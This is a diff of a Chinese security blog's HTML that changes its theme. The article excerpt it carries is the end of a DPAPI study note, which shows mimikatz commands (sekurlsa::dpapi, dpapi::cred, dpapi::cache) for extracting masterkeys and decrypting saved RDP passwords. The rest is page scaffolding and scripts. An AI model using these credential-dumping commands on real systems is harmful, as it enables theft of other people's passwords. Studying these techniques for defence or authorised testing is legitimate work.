+<p>其实这里可以直接用mimikatz读取所有masterkeyfile对应的masterkey，使用命令：<br><figure class="highlight plain"><div class="mdui-table-fluid theme-post__card__table--flat"><table class="mdui-table mdui-table-hoverable "><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::dpapi</span><br></pre></td></tr></table></div></figure></p>
 <p><img src="/2020/06/24/DPAPI学习记录/sekurlsa.png" alt><br>这里其实mimikatz已经将masterkey放入缓存中，下次我们读取cred文件的时候mimikatz会直接利用masterkey进行解密。</p>
-<p>我们再运行命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpapi::cred /in:C:\Users\swag7&gt;dir /a C:\Users\swag7\AppData\Local\Microsoft\Credentials\0584A81C75E5FE36C40B464C8CFBCD0F</span><br></pre></td></tr></table></figure></p>
+<p>我们再运行命令<br><figure class="highlight plain"><div class="mdui-table-fluid theme-post__card__table--flat"><table class="mdui-table mdui-table-hoverable "><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpapi::cred /in:C:\Users\swag7&gt;dir /a C:\Users\swag7\AppData\Local\Microsoft\Credentials\0584A81C75E5FE36C40B464C8CFBCD0F</span><br></pre></td></tr></table></div></figure></p>
 <p>结果如下，成功读取远程密码：<br><img src="/2020/06/24/DPAPI学习记录/08067.png" alt></p>
-<p>查看dpapi缓存：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpapi::cache</span><br></pre></td></tr></table></figure></p>
+<p>查看dpapi缓存：<br><figure class="highlight plain"><div class="mdui-table-fluid theme-post__card__table--flat"><table class="mdui-table mdui-table-hoverable "><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpapi::cache</span><br></pre></td></tr></table></div></figure></p>
 <p><img src="/2020/06/24/DPAPI学习记录/cache.png" alt></p>
 <h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E5%88%A9%E7%94%A8Masterkey%E7%A6%BB%E7%BA%BF%E5%AF%BC%E5%87%BAChrome%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81/" target="_blank" rel="noopener">https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E5%88%A9%E7%94%A8Masterkey%E7%A6%BB%E7%BA%BF%E5%AF%BC%E5%87%BAChrome%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81/</a></p>
 <p><a href="https://xz.aliyun.com/t/6508" title="通过Dpapi获取Windows身份凭证" target="_blank" rel="noopener">https://xz.aliyun.com/t/6508</a></p>
 <p><a href="https://mp.weixin.qq.com/s?__biz=MzU0MjUxNjgyOQ==&amp;mid=2247484902&amp;idx=1&amp;sn=34368d206718cb54c25b313269e2aad1&amp;chksm=fb1836d4cc6fbfc2b7a7e58f56165bee8d32acf1b4401db97871ecca6b9d553defc9a2aa8d90&amp;mpshare=1&amp;scene=1&amp;srcid=&amp;sharer_sharetime=1592704653330&amp;sharer_shareid=77d7080072e01bc1b7467c4c6be5286c&amp;key=a400e754e637d7415ea75085024d4d38cf9dbbc9afdc43acf760292d0b8f00b2cf04e6c13a4c4026323f5be1b4ef454b37f2f7306c95be2be60c4b53e04c88e881748c5c6edef709b9fa51235514ab79&amp;ascene=1&amp;uin=MjYzNzcxNDgzMw%3D%3D&amp;devicetype=Windows+10+x64&amp;version=62090070&amp;lang=zh_CN&amp;exportkey=A2tUlfv5mKxyCotw15u%2BvFM%3D&amp;pass_ticket=ckOSR7XKlwU3rEqxX2SpxqCdFprRDHd9WP%2FItnFo%2F%2FQWwsYS36JtDqzeqMJxpCHX" title="获取已控机器本地保存的RDP密码" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzU0MjUxNjgyOQ==&amp;mid=2247484902&amp;idx=1&amp;sn=34368d206718cb54c25b313269e2aad1&amp;chksm=fb1836d4cc6fbfc2b7a7e58f56165bee8d32acf1b4401db97871ecca6b9d553defc9a2aa8d90&amp;mpshare=1&amp;scene=1&amp;srcid=&amp;sharer_sharetime=1592704653330&amp;sharer_shareid=77d7080072e01bc1b7467c4c6be5286c&amp;key=a400e754e637d7415ea75085024d4d38cf9dbbc9afdc43acf760292d0b8f00b2cf04e6c13a4c4026323f5be1b4ef454b37f2f7306c95be2be60c4b53e04c88e881748c5c6edef709b9fa51235514ab79&amp;ascene=1&amp;uin=MjYzNzcxNDgzMw%3D%3D&amp;devicetype=Windows+10+x64&amp;version=62090070&amp;lang=zh_CN&amp;exportkey=A2tUlfv5mKxyCotw15u%2BvFM%3D&amp;pass_ticket=ckOSR7XKlwU3rEqxX2SpxqCdFprRDHd9WP%2FItnFo%2F%2FQWwsYS36JtDqzeqMJxpCHX</a></p>
 
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-      
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-        <div class="post-tags">
-          
-            <a href="/tags/内网渗透/" rel="tag"># 内网渗透</a>
-          
-        </div>
-      
-
-      
-      
-      
-
-      
-        <div class="post-nav">
-          <div class="post-nav-next post-nav-item">
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls"
+                data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
             
-              <a href="/2020/06/22/Fastjson-1-2-47-反序列化漏洞/" rel="next" title="Fastjson<=1.2.47 反序列化漏洞">
-                <i class="fa fa-chevron-left"></i> Fastjson<=1.2.47 反序列化漏洞 < a>
-            
-          </=1.2.47></a></div>
-
-          <span class="post-nav-divider"></span>
-
-          <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2020/06/24/钓鱼小结/" rel="prev" title="钓鱼小结">
-                钓鱼小结 <i class="fa fa-chevron-right"></i>
-              </a>
-            
-          </div>
-        </div>
-      
-
-      
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-  </div>
-
-
-          </div>
-          
-
-  
-
-
-
-        </div>
-        
-          
-  
-  <div class="sidebar-toggle">
-    <div class="sidebar-toggle-line-wrap">
-      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
-    </div>
-  </div>
-
-  <aside id="sidebar" class="sidebar">
-    
-    <div class="sidebar-inner">
-
-      
-
-      
-        <ul class="sidebar-nav motion-element">
-          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
-            文章目录
-          </li>
-          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
-            站点概览
-          </li>
-        </ul>
-      
-
-      <div class="site-overview-wrap sidebar-panel">
-        <div class="site-overview">
-          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
-            
-              <p class="site-author-name" itemprop="name">sher10ck</p>
-              <p class="site-description motion-element" itemprop="description"></p>
-          </div>
-
-          
-            <nav class="site-state motion-element">
-              
-                <div class="site-state-item site-state-posts">
+            <ul id="audio-list" style="display:none">
                 
-                  <a href="/archives/">
-                
-                    <span class="site-state-item-count">87</span>
-                    <span class="site-state-item-name">日志</span>
-                  </a>
+            </ul>
+            
+            
+            
+    <div id='gitalk-container' class="comment link"
+        data-ae='true'
+        data-ci='ec894e2b66f752e8b7fb'
+        data-cs='3ccc2e92bb350688fe2c2dc2930189b62622bfb1'
+        data-r='blog-comments'
+        data-o='TriDiamond'
+        data-a='TriDiamond'
+        data-d=''
+    >留言</div>
+
+
+            
+            
+        </div>
+        <div class="sidebar">
+            <div class="box animated fadeInRight">
+                <div class="subbox">
+                    <img src="https://res.cloudinary.com/tridiamond/image/upload/v1573019751/TriDiamond_logo_ui_xeublz.jpg" height=300 width=300></img>
+                    <p>sher10ck</p>
+                    <span>Love Sriracha?</span>
+                    <dl>
+                        <dd><a href="https://github.com/TriDiamond" target="_blank"><span
+                                    class=" iconfont icon-github"></span></a></dd>
+                        <dd><a href="https://twitter.com/TriDiamond6" target="_blank"><span
+                                    class=" iconfont icon-twitter"></span></a></dd>
+                        <dd><a href="https://stackoverflow.com/users/7602324/tridiamond?tab=profile" target="_blank"><span
+                                    class=" iconfont icon-stack-overflow"></span></a></dd>
+                    </dl>
                 </div>
-              
-
-              
-
-              
-                
-                
-                <div class="site-state-item site-state-tags">
-                  
-                    
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                    <span class="site-state-item-count">27</span>
-                    <span class="site-state-item-name">标签</span>
-                  
+                <ul>
+                    <li><a href="/">87 <p>文章</p></a></li>
+                    <li><a href="/categories">0 <p>分类</p></a></li>
+                    <li><a href="/tags">27 <p>标签</p></a></li>
+                </ul>
+            </div>
+            
+            
+            
+            <div class="box sticky animated fadeInRight faster">
+                <div id="toc" class="subbox">
+                    <h4>目录</h4>
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#什么是DPAPI"><span class="toc-number">1.</span> <span class="toc-text">什么是DPAPI</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Master-Key-Files"><span class="toc-number">2.</span> <span class="toc-text">Master Key Files</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#破解rdp密码"><span class="toc-number">3.</span> <span class="toc-text">破解rdp密码</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#参考资料"><span class="toc-number">4.</span> <span class="toc-text">参考资料</span></a></li></ol>
                 </div>
-              
-            </nav>
-          
-
-          
-            <div class="feed-link motion-element">
-              <a href="/atom.xml" rel="alternate">
-                <i class="fa fa-rss"></i>
-                RSS
-              </a>
             </div>
-          
-
-          
-
-          
-
-          
-          
-            <div class="links-of-blogroll motion-element links-of-blogroll-block">
-              <div class="links-of-blogroll-title">
-                <i class="fa  fa-fw fa-link"></i>
-                Links
-              </div>
-              <ul class="links-of-blogroll-list">
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="https://wulidecade.cn" title="https://wulidecade.cn" rel="noopener" target="_blank">Decade</a>
-                  </li>
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="http://mang0.me/" title="http://mang0.me/" rel="noopener" target="_blank">Mang0</a>
-                  </li>
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="https://blog.singll.cc/" title="https://blog.singll.cc/" rel="noopener" target="_blank">Singll</a>
-                  </li>
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="https://timeshu.github.io/" title="https://timeshu.github.io/" rel="noopener" target="_blank">Time</a>
-                  </li>
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="https://hit0on.github.io/" title="https://hit0on.github.io/" rel="noopener" target="_blank">HitOn</a>
-                  </li>
-                
-              </ul>
-            </div>
-          
-
-          
             
-          
-          
-
+            
         </div>
-      </div>
-
-      
-      <!--noindex-->
-        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
-          <div class="post-toc">
-
-            
-            
-            
-            
-
-            
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#什么是DPAPI"><span class="nav-number">1.</span> <span class="nav-text">什么是DPAPI</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Master-Key-Files"><span class="nav-number">2.</span> <span class="nav-text">Master Key Files</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#破解rdp密码"><span class="nav-number">3.</span> <span class="nav-text">破解rdp密码</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参考资料"><span class="nav-number">4.</span> <span class="nav-text">参考资料</span></a></li></ol></div>
-            
-
-          </div>
-        </div>
-      <!--/noindex-->
-      
-
-      
-
     </div>
-  </aside>
-
-
-        
-      </div>
-    </main>
-
-    <footer id="footer" class="footer">
-      <div class="footer-inner">
-        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
-  <span class="with-love" id="animate">
-    <i class="fa fa-user"></i>
-  </span>
-  <span class="author" itemprop="copyrightHolder">sher10ck</span>
-
-  
-
-  
 </div>
 
+    </div>
+</div>
+    <div id="back-to-top" class="animated fadeIn faster">
+        <div class="flow"></div>
+        <span class="percentage animated fadeIn faster">0%</span>
+        <span class="iconfont icon-top02 animated fadeIn faster"></span>
+    </div>
+</body>
+<footer>
+    <p class="copyright" id="copyright">
+        &copy; 2020
+        <span class="gradient-text">
+            sher10ck
+        </span>.
+        Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a>
+        Theme
+        <span class="gradient-text">
+            <a href="https://github.com/TriDiamond/hexo-theme-obsidian" title="Obsidian" target="_blank" rel="noopener">Obsidian</a>
+        </span>
+        <small><a href="https://github.com/TriDiamond/hexo-theme-obsidian/blob/master/CHANGELOG.md" title="v1.4.3" target="_blank" rel="noopener">v1.4.3</a></small>
+    </p>
+</footer>
 
-  <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v3.9.0</div>
-
-
-
-  <span class="post-meta-divider">|</span>
-
-
-
-  <div class="theme-info">主题 – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a> v6.7.0</div>
-
-
-
-
-        
-
-
-
-
-
-
-
-
-        
-      </div>
-    </footer>
-
-    
-      <div class="back-to-top">
-        <i class="fa fa-arrow-up"></i>
-        
-      </div>
-    
-
-    
-
-    
-
-    
-  </div>
-
-  
-
+<script type="text/javascript" src="https://cdn.bootcss.com/mathjax/2.7.6/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
 <script>
-  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
-    window.Promise = null;
+  MathJax.Hub.Config({
+    "HTML-CSS": {
+      preferredFont: "TeX",
+      availableFonts: ["STIX", "TeX"],
+      linebreaks: {
+        automatic: true
+      },
+      EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
+    },
+    tex2jax: {
+      inlineMath: [
+        ["$", "$"],
+        ["\\(", "\\)"]
+      ],
+      processEscapes: true,
+      ignoreClass: "tex2jax_ignore|dno",
+      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    },
+    TeX: {
+      noUndefined: {
+        attributes: {
+          mathcolor: "red",
+          mathbackground: "#FFEEEE",
+          mathsize: "90%"
+        }
+      },
+      Macros: {
+        href: "{}"
+      }
+    },
+    messageStyle: "none"
+  });
+</script>
+<script>
+  function initialMathJax() {
+    MathJax.Hub.Queue(function () {
+      var all = MathJax.Hub.getAllJax(),
+        i;
+      // console.log(all);
+      for (i = 0; i < all.length; i += 1) {
+        console.log(all[i].SourceElement().parentNode)
+        all[i].SourceElement().parentNode.className += ' has-jax';
+      }
+    });
+  }
+
+  function reprocessMathJax() {
+    if (typeof MathJax !== 'undefined') {
+      MathJax.Hub.Queue(["Typeset", MathJax.Hub]);
+    }
   }
 </script>
 
 
 
+    <link rel="stylesheet" href="//cdn.bootcss.com/gitalk/1.5.0/gitalk.min.css">
+    <script src="//cdn.bootcss.com/gitalk/1.5.0/gitalk.min.js"></script>
+
+<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/obsidian.js"></script>
+<script src="/js/jquery.truncate.js"></script>
+<script src="/js/search.js"></script>
+<script src="//cdn.bootcss.com/typed.js/2.0.10/typed.min.js"></script>
+<script src="//cdn.bootcss.com/blueimp-md5/2.12.0/js/md5.min.js"></script>
+<script src="//cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script>
+
+<script src="https://cdn.bootcss.com/codemirror/5.48.4/codemirror.min.js"></script>
+
+    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/javascript/javascript.min.js"></script>
+
+    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/css/css.min.js"></script>
+
+    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/xml/xml.min.js"></script>
+
+    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/htmlmixed/htmlmixed.min.js"></script>
+
+    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/clike/clike.min.js"></script>
+
+    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/php/php.min.js"></script>
+
+    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/shell/shell.min.js"></script>
+
+    <script src="//cdn.bootcss.com/codemirror/5.48.4/mode/python/python.min.js"></script>
+
+
+
+    <script src="/js/busuanzi.min.js"></script>
+    <script>
+        $(document).ready(function () {
+            if ($('span[id^="busuanzi_"]').length) {
+                initialBusuanzi();
+            }
+        });
+    </script>
+
+
+<link rel="stylesheet" href="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe.min.css">
+<link rel="stylesheet" href="//cdn.bootcss.com/photoswipe/4.1.3/default-skin/default-skin.min.css">
+<script src="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe.min.js"></script>
+<script src="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe-ui-default.min.js"></script>
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+    <script async src="//www.googletagmanager.com/gtag/js?id=UA-149874671-1"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
 
+        gtag('config', 'UA-149874671-1');
+    </script>
 
 
 
 
 
+<script>
+    function initialTyped () {
+        var typedTextEl = $('.typed-text');
+        if (typedTextEl && typedTextEl.length > 0) {
+            var typed = new Typed('.typed-text', {
+                strings: ["Love Sriracha?", "喜欢就多加一点 :)"],
+                typeSpeed: 90,
+                loop: true,
+                loopCount: Infinity,
+                backSpeed: 20,
+            });
+        }
+    }
 
+    if ($('.article-header') && $('.article-header').length) {
+        $(document).ready(function () {
+            initialTyped();
+        });
+    }
+</script>
 
 
 
 
-
-
-
-
-
-
-
-
-
-
-
-
-  
-  <script src="/lib/jquery/index.js?v=2.1.3"></script>
-
-  
-  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
-
-  
-  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
-
-
-  
-
-
-  <script src="/js/src/utils.js?v=6.7.0"></script>
-
-  <script src="/js/src/motion.js?v=6.7.0"></script>
-
-
-
-  
-  
-
-  
-  <script src="/js/src/scrollspy.js?v=6.7.0"></script>
-<script src="/js/src/post-details.js?v=6.7.0"></script>
-
-
-
-  
-
-
-  <script src="/js/src/bootstrap.js?v=6.7.0"></script>
-
-
-
-  
-  
-
-
-
-
-
-  
-
-
-
-
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-</body>
 </html>
